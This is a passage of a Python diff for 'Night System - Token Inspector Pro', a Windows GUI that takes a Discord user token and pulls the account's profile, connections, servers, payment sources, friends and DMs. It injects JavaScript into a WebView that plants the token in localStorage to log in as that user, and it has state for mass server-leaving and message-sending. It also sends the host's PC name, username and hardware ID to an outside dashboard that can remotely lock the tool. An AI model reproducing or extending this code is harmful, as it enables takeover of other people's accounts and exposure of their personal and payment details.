C["text_muted"]).pack(side="right")\n\n    def _build_billing_tab(self):\n        scroll = ctk.CTkScrollableFrame(self.frame_billing, fg_color="transparent")\n        scroll.pack(fill="both", expand=True)\n\n        lbl = ctk.CTkLabel(scroll, text="Nitro & Zahlungsmethoden", font=("Segoe UI", 16, "bold"), text_color=C["text"])\n        lbl.pack(anchor="w", pady=(0, 10))\n\n        if not self.billing_data:\n            ctk.CTkLabel(scroll, text="Keine Zahlungsmethoden hinterlegt.", font=("Segoe UI", 11), text_color=C["text_muted"]).pack(anchor="w", pady=10)\n        else:\n            for b in self.billing_data:\n                card = ctk.CTkFrame(scroll, fg_color=C["card"], corner_radius=14, border_width=1, border_color=C["card_border"])\n                card.pack(fill="x", pady=4)\n                ci = ctk.CTkFrame(card, fg_color="transparent")\n                ci.pack(fill="x", padx=16, pady=12)\n\n                b_type = b.get("type", 1)\n                b_name = "Kreditkarte" if b_type == 1 else "PayPal"\n                tag = "CC" if b_type == 1 else "PP"\n\n                tag_badge = ctk.CTkLabel(ci, text=tag, font=("Segoe UI", 10.5, "bold"), text_color=C["text_sub"], width=36, height=36, fg_color=C["card_alt"], corner_radius=18)\n                tag_badge.pack(side="left", padx=(0, 10))\n\n                ctk.CTkLabel(ci, text=f"{b_name} | {b.get(\'email\') or b.get(\'brand\', \'\').upper() + \' **** \' + str(b.get(\'last_4\', \'\'))}", font=("Segoe UI", 12, "bold"), text_color=C["text"]).pack(side="left")\n\n    def _load_avatar_async(self):\n        uid = self.user_data.get("id")\n        av_hash = self.user_data.get("avatar")\n        if not uid or not av_hash:\n            return\n\n        def _fetch():\n            try:\n                url = f"https://cdn.discordapp.com/avatars/{uid}/{av_hash}.png?size=256"\n                r = requests.get(url, timeout=5)\n                if r.status_code == 200:\n                    pil = Image.open(io.BytesIO(r.content))\n                    round_pil = make_circle_avatar(pil, size=(80, 80))\n                    mini_pil = make_circle_avatar(pil, size=(40, 40))\n                    if round_pil:\n                        self.avatar_img_ctk = ctk.CTkImage(round_pil, size=(80, 80))\n                        self.after(0, lambda: self.lbl_hero_avatar.configure(image=self.avatar_img_ctk, text=""))\n                    if mini_pil:\n                        mini_ctk = ctk.CTkImage(mini_pil, size=(40, 40))\n                        self.after(0, lambda: self.lbl_side_avatar.configure(image=mini_ctk, text=""))\n            except Exception:\n                pass\n\n        threading.Thread(target=_fetch, daemon=True).start()\n\n    def launch_browser_login(self):\n        token = self.token.strip()\n        if not token:\n            return\n\n        username = self.user_data.get("username", "") or self.user_data.get("global_name", "")\n\n        if getattr(sys, \'frozen\', False):\n            cmd = [sys.executable, "--browser", token, username]\n        else:\n            cmd = [sys.executable, os.path.abspath(__file__), "--browser", token, username]\n\n        try:\n            subprocess.Popen(cmd)\n        except Exception:\n            threading.Thread(target=run_browser_session, args=(token, username), daemon=True).start()\n\n\ndef check_cloud_status_and_update():\n    """\n    Verbindet mit https://whatsapp-kadi.onrender.com/api/discord/heartbeat:\n    1. Prueft, ob das Tool ueber das Web-Dashboard gesperrt ist.\n    2. Prueft, ob ein Update verfuegbar ist (und gibt dies im CMD-Fenster aus).\n    3. Registriert die Instanz im Cloud-Dashboard unter Aktive Instanzen.\n    """\n    import socket, platform, uuid\n    pc_name = os.environ.get("COMPUTERNAME") or socket.gethostname() or "PC"\n    username = os.environ.get("USERNAME") or "Benutzer"\n    os_name = f"{platform.system()} {platform.release()}"\n    hwid = f"HWID-{uuid.getnode():012X}"\n\n    payload = {\n        "clientId": f"{pc_name}_{username}",\n        "hwid": hwid,\n        "pcName": pc_name,\n        "username": username,\n        "os": os_name,\n        "version": DISCORD_TOOL_VERSION\n    }\n\n    print("  ================================================================")\n    print("   NIGHT SYSTEM • DISCORD ENGINE v" + DISCORD_TOOL_VERSION)\n    print("  ================================================================")\n    print("  [*] Verbinde mit Cloud Dashboard (whatsapp-kadi.onrender.com)...")\n\n    cloud_info = {\n        "is_locked": False,\n        "lock_reason": "",\n        "update_available": False,\n        "latest_version": DISCORD_TOOL_VERSION,\n        "changelog": "",\n        "download_url": "https://whatsapp-kadi.onrender.com/download/Nightheid.exe",\n        "announcement": ""\n    }\n\n    try:\n        res = requests.post(f"{CLOUD_API_ENDPOINT}/heartbeat", json=payload, timeout=4)\n        if res.status_code == 200:\n            data = res.json()\n            is_locked = data.get("isLocked", False)\n            lock_reason = data.get("lockReason", "Wartungsarbeiten durch Administrator.")\n            latest_version = data.get("latestVersion", DISCORD_TOOL_VERSION)\n            update_available = data.get("updateAvailable", False)\n            changelog = data.get("changelog", "")\n            download_url = data.get("downloadUrl", "https://whatsapp-kadi.onrender.com/download/Nightheid.exe")\n            announcement = data.get("announcement", "")\n\n            cloud_info["is_locked"] = is_locked\n            cloud_info["lock_reason"] = lock_reason\n            cloud_info["update_available"] = update_available\n            cloud_info["latest_version"] = latest_version\n            cloud_info["changelog"] = changelog\n            cloud_info["download_url"] = download_url\n            cloud_info["announcement"] = announcement\n\n            if is_locked:\n                print(f"\\n  [GESPERRT] Tool wurde ueber das Web-Dashboard gesperrt!")\n                print(f"  [GRUND] {lock_reason}")\n                print("  [STOP] Start abgebrochen. Bitte Administrator kontaktieren.\\n")\n                try:\n                    import tkinter as tk\n                    from tkinter import messagebox\n                    root = tk.Tk()\n                    root.withdraw()\n                    messagebox.showerror(\n                        "Night System - Gesperrt",\n                        f"Dieses Tool wurde ueber das Web-Dashboard gesperrt!\\n\\nGrund: {lock_reason}\\n\\nBitte versuche es spaeter erneut."\n                    )\n                    root.destroy()\n                except Exception:\n                    pass\n                sys.exit(1)\n            else:\n                print("  [STATUS] Tool ist freigegeben und autorisiert.")\n\n            if update_available and latest_version != DISCORD_TOOL_VERSION:\n                print(f"\\n  [UPDATE] Neues Update verfuegbar: v{latest_version} (Aktuell: v{DISCORD_TOOL_VERSION})!")\n                if changelog:\n                    first_line = changelog.split(\'\\n\')[0]\n                    print(f"  [CHANGELOG] {first_line}")\n                print(f"  [DOWNLOAD] Herunterladen auf: {download_url}\\n")\n            else:\n                print(f"  [UPDATE-CHECK] Version v{DISCORD_TOOL_VERSION} ist aktuell. Kein Update verfuegbar.\\n")\n\n            if announcement:\n                print(f"  [BROADCAST] {announcement}\\n")\n    except Exception as ex:\n        print(f"  [HINWEIS] Cloud Dashboard offline oder nicht erreichbar ({ex}).")\n        print(f"  [OFFLINE] Lokaler Modus aktiv (v{DISCORD_TOOL_VERSION}).\\n")\n\n    return cloud_info\n\n# ==============================================================================\n#  TERMINAL VALIDATOR & PROGRESS LOADER (Ohne Emojis)\n# ==============================================================================\ndef validate_and_load_in_terminal(preset_token=None):\n    try:\n        import ctypes\n        ctypes.windll.kernel32.SetConsoleTitleW("Night System - Token Loader Pro")\n        ctypes.windll.kernel32.SetConsoleOutputCP(65001)\n        ctypes.windll.kernel32.SetConsoleCP(65001)\n    except Exception:\n        pass\n\n    if os.name == "nt":\n        os.system("color")\n        os.system("cls")\n    else:\n        os.system("clear")\n\n    cloud_info = check_cloud_status_and_update()\n\n    print("  [Night System] Bitte Discord-Token einfuegen / eingeben:\\n")\n\n    token = ""\n    user_data = {}\n    connections_data = []\n    guilds_data = []\n    billing_data = []\n    friends_data = []\n    user_to_channel_map = {}\n\n    while True:\n        if preset_token:\n            token = preset_token.strip()\n            preset_token = None\n        else:\n            try:\n                token = input("  Token: ").strip()\n            except (EOFError, KeyboardInterrupt):\n                sys.exit(0)\n\n        if (token.startswith(\'"\') and token.endswith(\'"\')) or (token.startswith("\'") and token.endswith("\'")):\n            token = token[1:-1].strip()\n\n        # Demo Fallback\n        if not token or token.lower() == "demo":\n            print("\\n  [*] Demo-Modus aktiviert.")\n            user_data = DEMO_DATA["user"]\n            connections_data = DEMO_DATA["connections"]\n            guilds_data = DEMO_DATA["guilds"]\n            billing_data = DEMO_DATA["billing"]\n            friends_data = DEMO_DATA["friends"]\n            user_to_channel_map = DEMO_DATA["user_to_channel_map"]\n            token = "mfa.VkO_2G4Qv3T...DEMO_TOKEN..."\n            break\n\n        print("  [*] Ueberpruefe Token mit Discord API...")\n        headers = {"Authorization": token}\n        try:\n            r = requests.get("https://discord.com/api/v10/users/@me", headers=headers, timeout=8)\n            if r.status_code == 200:\n                user_data = r.json()\n                print(f"  [OK] Token gueltig! (Eingeloggt als @{user_data.get(\'username\')})")\n\n                try:\n                    rc = requests.get("https://discord.com/api/v10/users/@me/connections", headers=headers, timeout=5)\n                    connections_data = rc.json() if rc.status_code == 200 else []\n                except Exception: connections_data = []\n\n                try:\n                    rg = requests.get("https://discord.com/api/v10/users/@me/guilds", headers=headers, timeout=5)\n                    guilds_data = rg.json() if rg.status_code == 200 else []\n                except Exception: guilds_data = []\n\n                try:\n                    rb = requests.get("https://discord.com/api/v10/users/@me/billing/payment-sources", headers=headers, timeout=5)\n                    billing_data = rb.json() if rb.status_code == 200 else []\n                except Exception: billing_data = []\n\n                try:\n                    fresh_f = []\n                    rf = requests.get("https://discord.com/api/v10/users/@me/relationships", headers=headers, timeout=5)\n                    if rf.status_code == 200:\n                        for item in rf.json():\n                            u_info = item.get("user", {})\n                            fresh_f.append({\n                                "id": str(item.get("id", u_info.get("id"))),\n                                "name": u_info.get("global_name") or u_info.get("username", "Freund"),\n                                "username": u_info.get("username", ""),\n                                "type_name": "Freund" if item.get("type") == 1 else ("Anfrage" if item.get("type") in (3, 4) else "Blockiert"),\n                                "is_group": False\n                            })\n                    rc = requests.get("https://discord.com/api/v10/users/@me/channels", headers=headers, timeout=5)\n                    if rc.status_code == 200:\n                        for ch in rc.json():\n                            ch_type = ch.get("type")\n                            recips = ch.get("recipients", [])\n                            recip_names = ", ".join([rcp.get("username", "") for rcp in recips[:3]])\n                            if ch_type == 3:\n                                g_name = ch.get("name") or (f"Gruppe ({recip_names})" if recip_names else "Gruppe")\n                                fresh_f.append({\n                                    "id": str(ch.get("id")),\n                                    "name": g_name,\n                                    "username": f"{len(recips)} Mitglieder",\n                                    "type_name": "Gruppe",\n                                    "is_group": True\n                                })\n                            elif ch_type == 1 and recips:\n                                dm_uid = str(recips[0].get("id"))\n                                user_to_channel_map[dm_uid] = str(ch.get("id"))\n                                if not any(f["id"] == dm_uid for f in fresh_f):\n                                    fresh_f.append({\n                                        "id": str(ch.get("id")),\n                                        "name": recips[0].get("global_name") or recips[0].get("username", "DM"),\n                                        "username": recips[0].get("username", ""),\n                                        "type_name": "DM",\n                                        "is_group": True\n                                    })\n                    friends_data = fresh_f\n                except Exception:\n                    friends_data = []\n\n                break\n            else:\n                print(f"  [FEHLER] Token ist ungueltig (Status {r.status_code})! Bitte erneut versuchen.\\n")\n        except Exception as e:\n            print(f"  [FEHLER] Verbindungsfehler ({e})! Bitte erneut versuchen.\\n")\n\n    # Loader im Terminal\n    print("\\n  " + "-" * 55)\n    loader_steps = [\n        "Verifiziere Discord-Sitzung...",\n        "Lade Benutzerprofil & Badges...",\n        "Synchronisiere Server, Freunde & DMs...",\n        "Initialisiere Glassmorphism UI..."\n    ]\n    for step in loader_steps:\n        print(f"  [>] {step:<42} [OK]")\n        time.sleep(0.3)\n\n    print("  [OK] Bereit! Oeffne Benutzeroberflaeche...\\n")\n    time.sleep(0.4)\n\n    return user_data, connections_data, guilds_data, billing_data, friends_data, user_to_channel_map, token, cloud_info\n\n\n# ==============================================================================\n#  ENTRY POINT\n# ==============================================================================\nif __name__ == "__main__":\n    if len(sys.argv) > 1 and sys.argv[1] == "--browser":\n        try:\n            import ctypes\n            hwnd = ctypes.windll.kernel32.GetConsoleWindow()\n            if hwnd:\n                ctypes.windll.user32.ShowWindow(hwnd, 0)\n        except Exception:\n            pass\n        t = sys.argv[2] if len(sys.argv) > 2 else ""\n        u = sys.argv[3] if len(sys.argv) > 3 else ""\n        run_browser_session(t, u)\n        sys.exit(0)\n    elif len(sys.argv) > 1 and sys.argv[1] == "--token":\n        t = sys.argv[2] if len(sys.argv) > 2 else ""\n        u_data, c_data, g_data, b_data, f_data, u_ch_map, active_token, c_info = validate_and_load_in_terminal(preset_token=t)\n        app = App(\n            user_data=u_data,\n            connections_data=c_data,\n            guilds_data=g_data,\n            billing_data=b_data,\n            friends_data=f_data,\n            user_to_channel_map=u_ch_map,\n            token=active_token,\n            cloud_info=c_info\n        )\n        app.mainloop()\n    else:\n        u_data, c_data, g_data, b_data, f_data, u_ch_map, active_token, c_info = validate_and_load_in_terminal()\n\n        app = App(\n            user_data=u_data,\n            connections_data=c_data,\n            guilds_data=g_data,\n            billing_data=b_data,\n            friends_data=f_data,\n            user_to_channel_map=u_ch_map,\n            token=active_token,\n            cloud_info=c_info\n        )\n        app.mainloop()\n'
+# Configure UTF-8 on Windows console immediately
+try:
+    if sys.stdout and hasattr(sys.stdout, "reconfigure"):
+        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
+    if sys.stderr and hasattr(sys.stderr, "reconfigure"):
+        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
+except Exception:
+    pass
 
-with open('ff.py', 'w', encoding='utf-8') as out:
-    out.write(code)
-print('ff.py updated successfully!')
+import customtkinter as ctk
+from PIL import Image, ImageDraw
+import requests
+import threading
+import io
+import json
+import time
+import subprocess
+import re
+import random
+from datetime import datetime
+
+# ==============================================================================
+#  NIGHT SYSTEM • GLASSMORPHISM SILVER-GRAY DESIGN & FARBPALETTE (OHNE EMOJIS)
+# ==============================================================================
+C = {
+    # Frosted Slate / Silver-Gray Glaspalette
+    "bg":                   "#0d1017",
+    "sidebar":              "#121620",
+    "card":                 "#161b26",
+    "card_alt":             "#1b2232",
+    "card_hover":           "#222b3e",
+    "card_border":          "#263246",
+    "card_border_hi":       "#3a4964",
+    
+    # Button Palette
+    "btn_gray":             "#1a202c",
+    "btn_gray_hover":       "#262f40",
+    "btn_gray_border":      "#323e56",
+    "btn_gray_text":        "#e2e8f0",
+    
+    # Durchsichtige Akzent-Buttons & Karten
+    "acc_yellow_bg":        "#1a1d24",
+    "acc_yellow_border":    "#eab308",
+    "acc_yellow_text":      "#fde047",
+    "acc_yellow_hover":     "#26251b",
+    
+    "acc_purple_bg":        "#1a1d26",
+    "acc_purple_border":    "#a855f7",
+    "acc_purple_text":      "#d8b4fe",
+    "acc_purple_hover":     "#241d2e",
+
+    "acc_orange_bg":        "#1a1d24",
+    "acc_orange_border":    "#f97316",
+    "acc_orange_text":      "#fdba74",
+    "acc_orange_hover":     "#28201b",
+
+    "acc_green_bg":         "#171e22",
+    "acc_green_border":     "#22c55e",
+    "acc_green_text":       "#86efac",
+    "acc_green_hover":      "#1a261f",
+
+    "acc_cyan_bg":          "#161e27",
+    "acc_cyan_border":      "#06b6d4",
+    "acc_cyan_text":        "#67e8f9",
+    "acc_cyan_hover":       "#18252f",
+
+    # Typografie & Signale
+    "text":                 "#f8fafc",
+    "text_sub":             "#cbd5e1",
+    "text_muted":           "#818ea3",
+    "text_dim":             "#475569",
+    
+    "blurple":              "#5865f2",
+    "blurple_hi":           "#4752c4",
+    "green":                "#22c55e",
+    "green_bg":             "#13261a",
+    "green_border":         "#16a34a",
+    "red":                  "#ef4444",
+    "red_bg":               "#20181b",
+    "red_border":           "#dc2626",
+    "red_hover":            "#35171d",
+    "red_text":             "#fca5a5",
+}
+
+PLATFORM_ICONS = {
+    "spotify":       {"color": "#1db954", "tag": "SP", "name": "Spotify"},
+    "steam":         {"color": "#66c0f4", "tag": "ST", "name": "Steam"},
+    "twitch":        {"color": "#a970ff", "tag": "TW", "name": "Twitch"},
+    "youtube":       {"color": "#ff4444", "tag": "YT", "name": "YouTube"},
+    "github":        {"color": "#f0f6fc", "tag": "GH", "name": "GitHub"},
+    "reddit":        {"color": "#ff5722", "tag": "RD", "name": "Reddit"},
+    "twitter":       {"color": "#1da1f2", "tag": "TW", "name": "Twitter / X"},
+    "x":             {"color": "#ffffff", "tag": "X",  "name": "X (Twitter)"},
+    "xbox":          {"color": "#107c10", "tag": "XB", "name": "Xbox Live"},
+    "playstation":   {"color": "#006fcd", "tag": "PS", "name": "PlayStation"},
+    "battlenet":     {"color": "#00aeff", "tag": "BN", "name": "Battle.net"},
+    "riotgames":     {"color": "#eb0029", "tag": "RG", "name": "Riot Games"},
+    "tiktok":        {"color": "#00f2fe", "tag": "TT", "name": "TikTok"},
+}
+
+DEMO_DATA = {
+    "user": {
+        "id": "1083429182736451290",
+        "username": "nightheid_pro",
+        "global_name": "Night System Admin",
+        "avatar": None,
+        "discriminator": "0",
+        "public_flags": (1 << 6) | (1 << 9) | (1 << 22),
+        "flags": (1 << 6) | (1 << 9) | (1 << 22),
+        "banner": None,
+        "banner_color": "#5865f2",
+        "accent_color": 5793266,
+        "bio": "Night System - Silver-Glass Edition - Maximale Performance und Transparenz.",
+        "locale": "de",
+        "mfa_enabled": True,
+        "email": "maxia.night@example.com",
+        "verified": True,
+        "phone": "+49 170 .......",
+        "premium_type": 2
+    },
+    "connections": [
+        {"type": "spotify", "name": "Nightheid_Official", "verified": True, "show_activity": True},
+        {"type": "steam", "name": "NightSystem77", "verified": True, "show_activity": True},
+        {"type": "github", "name": "NightDev-Maxi", "verified": True, "show_activity": False},
+        {"type": "youtube", "name": "Night System Studio", "verified": True, "show_activity": True},
+        {"type": "twitch", "name": "nightheid_live", "verified": True, "show_activity": True},
+    ],
+    "guilds": [
+        {"id": "119283746501928374", "name": "Night System Community", "owner": True, "permissions": "8", "icon": None},
+        {"id": "228374659102938475", "name": "CyberSec Lab HQ", "owner": True, "permissions": "8", "icon": None},
+        {"id": "337485960293847561", "name": "Gaming Lounge VIP", "owner": False, "permissions": "8", "icon": None},
+        {"id": "448596071829304152", "name": "Phasmophobia Hunters EU", "owner": False, "permissions": "2048", "icon": None},
+        {"id": "559607182930415263", "name": "CustomTkinter Developers", "owner": False, "permissions": "1024", "icon": None},
+        {"id": "660718293041526374", "name": "Public Anime Hangout", "owner": False, "permissions": "1024", "icon": None},
+    ],
+    "friends": [
+        {"id": "1001", "name": "Alex Gamer", "username": "alex_gamer", "type_name": "Freund", "is_group": False},
+        {"id": "1002", "name": "Sarah C.", "username": "sarah_codes", "type_name": "Freund", "is_group": False},
+        {"id": "1003", "name": "Shadow Ninja", "username": "shadow_ninja", "type_name": "Freund", "is_group": False},
+        {"id": "1004", "name": "Gaming Squad EU", "username": "5 Mitglieder", "type_name": "Gruppe", "is_group": True},
+        {"id": "1005", "name": "Dev Lounge Group", "username": "3 Mitglieder", "type_name": "Gruppe", "is_group": True},
+        {"id": "1006", "name": "Lisa M.", "username": "lisa_music", "type_name": "Anfrage", "is_group": False},
+    ],
+    "billing": [
+        {"id": "9918273645", "type": 1, "brand": "visa", "last_4": "4242", "expires_month": 12, "expires_year": 2028, "invalid": False, "default": True},
+        {"id": "8827364510", "type": 2, "email": "maxia.paypal@example.com", "invalid": False, "default": False}
+    ],
+    "user_to_channel_map": {
+        "1001": "2001",
+        "1002": "2002",
+        "1003": "2003",
+        "1006": "2006"
+    }
+}
+
+ctk.set_appearance_mode("dark")
+ctk.set_default_color_theme("dark-blue")
+
+# ==============================================================================
+#  HILFSFUNKTIONEN & SICHERE API-ANFRAGEN
+# ==============================================================================
+def get_asset_path(filename):
+    if hasattr(sys, "_MEIPASS"):
+        p1 = os.path.join(sys._MEIPASS, "assets", filename)
+        if os.path.exists(p1): return p1
+        p2 = os.path.join(sys._MEIPASS, filename)
+        if os.path.exists(p2): return p2
+    base_dir = os.path.dirname(os.path.abspath(__file__))
+    candidates = [
+        os.path.join(os.path.dirname(sys.executable), "assets", filename),
+        os.path.join(base_dir, "..", "assets", filename),
+        os.path.join(base_dir, "assets", filename),
+        os.path.join(os.getcwd(), "assets", filename),
+        os.path.join(r"C:\Users\maxia\Desktop\Night System\assets", filename)
+    ]
+    for c in candidates:
+        if os.path.exists(c): return c
+    return None
+
+def snowflake_to_datetime_info(sf_id):
+    try:
+        sf_int = int(sf_id)
+        ts_ms = (sf_int >> 22) + 1420070400000
+        dt = datetime.fromtimestamp(ts_ms / 1000.0)
+        now = datetime.now()
+        days = (now - dt).days
+        years = days // 365
+        rem_days = days % 365
+        months = rem_days // 30
+        parts = []
+        if years > 0: parts.append(f"{years} J.")
+        if months > 0: parts.append(f"{months} M.")
+        if not parts: parts.append(f"{days} Tage")
+        short_age = " ".join(parts)
+        return dt.strftime("%d.%m.%Y"), f"vor {short_age}", days
+    except Exception:
+        return "Unbekannt", "-", 0
+
+def make_circle_avatar(pil_img, size=(64, 64)):
+    try:
+        pil_img = pil_img.resize(size, Image.Resampling.LANCZOS).convert("RGBA")
+        mask = Image.new("L", size, 0)
+        draw = ImageDraw.Draw(mask)
+        draw.ellipse((0, 0, size[0], size[1]), fill=255)
+        output = Image.new("RGBA", size, (0, 0, 0, 0))
+        output.paste(pil_img, (0, 0), mask=mask)
+        return output
+    except Exception:
+        return None
+
+def make_discord_api_request(method, url, token, json_data=None, timeout=6):
+    headers = {
+        "Authorization": token,
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "Content-Type": "application/json"
+    }
+    for _ in range(3):
+        try:
+            m = method.upper()
+            if m == "GET":
+                r = requests.get(url, headers=headers, timeout=timeout)
+            elif m == "POST":
+                r = requests.post(url, headers=headers, json=json_data if json_data is not None else {}, timeout=timeout)
+            elif m == "PATCH":
+                r = requests.patch(url, headers=headers, json=json_data if json_data is not None else {}, timeout=timeout)
+            elif m == "PUT":
+                r = requests.put(url, headers=headers, json=json_data if json_data is not None else {}, timeout=timeout)
+            elif m == "DELETE":
+                r = requests.delete(url, headers=headers, timeout=timeout)
+            else:
+                return None
+
+            if r.status_code == 429:
+                try:
+                    retry_sec = float(r.json().get("retry_after", 1.0))
+                except Exception:
+                    retry_sec = 1.0
+                time.sleep(min(retry_sec, 2.5))
+                continue
+
+            return r
+        except Exception:
+            time.sleep(0.3)
+    return None
+
+# ==============================================================================
+#  EXTRA-UI BROWSER AUTO-LOGIN (Microsoft Edge WebView2)
+# ==============================================================================
+def run_browser_session(token: str, username: str = ""):
+    import webview
+
+    token = token.strip()
+    if not token:
+        return
+
+    title = f"Night System - Discord Web Session - @{username}" if username else "Night System - Discord Web Session"
+    start_url = "https://discord.com/login"
+
+    raw_js = r"""
+    (function() {
+        const token = __TOKEN_JSON__;
+        const username = __USER_JSON__;
+
+        function injectTokenNow() {
+            try { localStorage.setItem("token", JSON.stringify(token)); } catch(e) {}
+            try { localStorage.token = JSON.stringify(token); } catch(e) {}
+            try {
+                let ifr = document.getElementById("__night_token_ifr");
+                if (!ifr) {
+                    ifr = document.createElement("iframe");
+                    ifr.id = "__night_token_ifr";
+                    ifr.style.display = "none";
+                    document.body.appendChild(ifr);
+                }
+                ifr.contentWindow.localStorage.setItem("token", JSON.stringify(token));
+                ifr.contentWindow.localStorage.token = JSON.stringify(token);
+            } catch(e) {}
+        }
+
+        injectTokenNow();
+        let count = 0;
+        let iv = setInterval(function() {
+            count++;
+            injectTokenNow();
+            if (count >= 15) {
+                clearInterval(iv);
+                if (window.location.pathname.includes("login") || window.location.pathname === "/" || window.location.pathname.includes("register")) {
+                    window.location.replace("https://discord.com/channels/@me");
+                }
+            }
+        }, 100);
+
+        function addFloatingBar() {
+            if (document.getElementById("night-helper-bar")) return;
+            const bar = document.createElement("div");
+            bar.id = "night-helper-bar";
+            const userLabel = username ? ('@' + username) : 'Auto-Login aktiv';
+            bar.innerHTML = '<div style="display:flex;align-items:center;gap:6px;"><span style="font-weight:700;color:#5865f2;">Night System</span><span style="color:#8b94a5;">|</span><span style="color:#c7cdd8;font-weight:600;">' + userLabel + '</span></div><button id="night-reinject-btn" style="background:#5865f2;color:#fff;border:none;border-radius:6px;padding:4px 10px;font-size:11px;font-weight:700;cursor:pointer;">Auto-Login</button><button id="night-reload-btn" style="background:#202b3d;color:#fff;border:1px solid #2e3d57;border-radius:6px;padding:4px 10px;font-size:11px;font-weight:600;cursor:pointer;">Reload</button><span id="night-close-bar" style="cursor:pointer;color:#8b94a5;font-weight:bold;padding-left:4px;">X</span>';
+            bar.style.cssText = "position:fixed;top:10px;right:18px;z-index:99999999;background:rgba(14,19,29,0.92);border:1px solid #2e3d57;backdrop-filter:blur(10px);border-radius:10px;padding:6px 14px;box-shadow:0 8px 30px rgba(0,0,0,0.6);display:flex;align-items:center;gap:12px;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;font-size:12px;color:#ffffff;user-select:none;";
+            document.body.appendChild(bar);
+
+            const rBtn = document.getElementById("night-reinject-btn");
+            if (rBtn) {
+                rBtn.onclick = function() {
+                    injectTokenNow();
+                    rBtn.innerText = "Eingeloggt";
+                    setTimeout(() => { window.location.replace("https://discord.com/channels/@me"); }, 500);
+                };
+            }
+            const relBtn = document.getElementById("night-reload-btn");
+            if (relBtn) { relBtn.onclick = function() { location.reload(); }; }
+            const cBtn = document.getElementById("night-close-bar");
+            if (cBtn) { cBtn.onclick = function() { bar.remove(); }; }
+        }
+        setTimeout(addFloatingBar, 1500);
+    })();
+    """
+    injection_js = raw_js.replace("__TOKEN_JSON__", json.dumps(token)).replace("__USER_JSON__", json.dumps(username))
+
+    window = webview.create_window(
+        title=title,
+        url=start_url,
+        width=1340,
+        height=880,
+        min_size=(960, 600),
+        text_select=True,
+    )
+
+    def on_loaded():
+        def run_js():
+            time.sleep(0.4)
+            try: window.evaluate_js(injection_js)
+            except Exception: pass
+        threading.Thread(target=run_js, daemon=True).start()
+
+    window.events.loaded += on_loaded
+    webview.start(private_mode=False)
+
+
+DISCORD_TOOL_VERSION = "1.1.0"
+CLOUD_API_ENDPOINT = "https://whatsapp-kadi.onrender.com/api/discord"
+
+# ==============================================================================
+#  HAUPTANWENDUNG (DURCHSICHTIGE SILVER-GLASS UI OHNE EMOJIS)
+# ==============================================================================
+class App(ctk.CTk):
+    def __init__(self, user_data=None, connections_data=None, guilds_data=None, billing_data=None, friends_data=None, user_to_channel_map=None, token="", cloud_info=None):
+        super().__init__()
+        self.title("Night System - Token Inspector Pro")
+        self.geometry("1260x840")
+        self.minsize(1020, 680)
+        self.configure(fg_color=C["bg"])
+        
+        # Echte Fenster-Transparenz (Durchsichtigkeits-Effekt)
+        try:
+            self.attributes("-alpha", 0.93)
+        except Exception:
+            pass
+
+        # Windows Taskleisten-Icon
+        icon_path = get_asset_path("icon.ico")
+        if icon_path and os.path.exists(icon_path):
+            try: self.iconbitmap(icon_path)
+            except Exception: pass
+
+        self.cloud_info = cloud_info or {}
+        self.token = token
+        self.user_data = user_data or {}
+        self.connections_data = connections_data or []
+        self.guilds_data = guilds_data or []
+        self.billing_data = billing_data or []
+        self.friends_data = friends_data or []
+        self.user_to_channel_map = user_to_channel_map or {}
+        self.active_tab = "overview"
+        self.avatar_img_ctk = None
+
+        # Server Management State
+        self.guild_cards = {}
+        self.guild_checkboxes = {}
+        self.leave_in_progress = False
+        self.stop_requested = False
+
+        # Freunde & Gruppen State
+        self.friend_cards = {}
+        self.friend_checkboxes = {}
+        self.friend_leave_in_progress = False
+        self.friend_stop_requested = False
+
+        # Extra Tab State
+        self.extra_in_progress = False
+        self.extra_stop_requested = False
+
+        # Bot & Click Instant State
+        self.bot_active = False
+        self.bot_loading = False
+        self.external_click_instant_win = None
+        self.click_instant_running = False
+
+        # Message Sender State
+        self.msg_send_in_progress = False
+        self.msg_stop_requested = False
+
+        self._build_layout()
+        self._load_avatar_async()
+
+    def _build_layout(self):
+        # 1. LINKE SIDEBAR (Navigation & User-Profil in runder Schiefer-Optik)
+        self.sidebar = ctk.CTkFrame(self, width=240, fg_color=C["sidebar"], corner_radius=18, border_width=1, border_color=C["card_border"])
+        self.sidebar.pack(side="left", fill="y", padx=(14, 7), pady=14)
+        self.sidebar.pack_propagate(False)
+        self._build_sidebar()
+
+        # 2. VOLLER MITTLERER CONTENT-BEREICH
+        self.center_area = ctk.CTkFrame(self, fg_color="transparent")
+        self.center_area.pack(side="left", fill="both", expand=True, padx=(7, 14), pady=14)
+        
+        # Container fuer dynamische Tabs
+        self.tab_container = ctk.CTkFrame(self.center_area, fg_color="transparent")
+        self.tab_container.pack(fill="both", expand=True)
+
+        self.frame_overview      = ctk.CTkFrame(self.tab_container, fg_color="transparent")
+        self.frame_guilds        = ctk.CTkFrame(self.tab_container, fg_color="transparent")
+        self.frame_friends       = ctk.CTkFrame(self.tab_container, fg_color="transparent")
+        self.frame_join          = ctk.CTkFrame(self.tab_container, fg_color="transparent")
+        self.frame_extra         = ctk.CTkFrame(self.tab_container, fg_color="transparent")
+        self.frame_bot           = ctk.CTkFrame(self.tab_container, fg_color="transparent")
+        self.frame_click_instant = ctk.CTkFrame(self.tab_container, fg_color="transparent")
+        self.frame_conn          = ctk.CTkFrame(self.tab_container, fg_color="transparent")
+        self.frame_billing       = ctk.CTkFrame(self.tab_container, fg_color="transparent")
+
+        self._build_overview_tab()
+        self._build_guilds_tab()
+        self._build_friends_tab()
+        self._build_join_tab()
+        self._build_extra_tab()
+        self._build_bot_tab()
+        self._build_click_instant_tab()
+        self._build_conn_tab()
+        self._build_billing_tab()
+
+        self._switch_tab("overview")
+        self._populate_quick_targets()
+        self._start_cloud_heartbeat_sync()
+
+    def _start_cloud_heartbeat_sync(self):
+        def _worker():
+            import socket, platform, uuid
+            pc_name = os.environ.get("COMPUTERNAME") or socket.gethostname() or "PC"
+            username = os.environ.get("USERNAME") or "Benutzer"
+            os_name = f"{platform.system()} {platform.release()}"
+            hwid = f"HWID-{uuid.getnode():012X}"
+
+            payload = {
+                "clientId": f"{pc_name}_{username}",
+                "hwid": hwid,
+                "pcName": pc_name,
+                "username": username,
+                "os": os_name,
+                "version": DISCORD_TOOL_VERSION
+            }
+
+            while True:
+                time.sleep(30)
+                try:
